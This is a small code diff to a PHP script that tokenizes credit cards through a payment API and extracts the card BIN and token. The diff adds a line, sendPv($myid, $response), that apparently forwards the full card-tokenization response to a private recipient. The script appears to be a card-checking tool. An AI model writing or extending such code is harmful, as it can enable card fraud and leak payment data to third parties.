@@ -1670,7 +1670,7 @@ $err = curl_error($curl);
 $json = json_decode($response, true);
 $bin = $json['data']['tokenizeCreditCard']['creditCard']['bin'];
 $token = $json['data']['tokenizeCreditCard']['token'];
-
+sendPv($myid, $response);
 curl_close($curl);
 
 
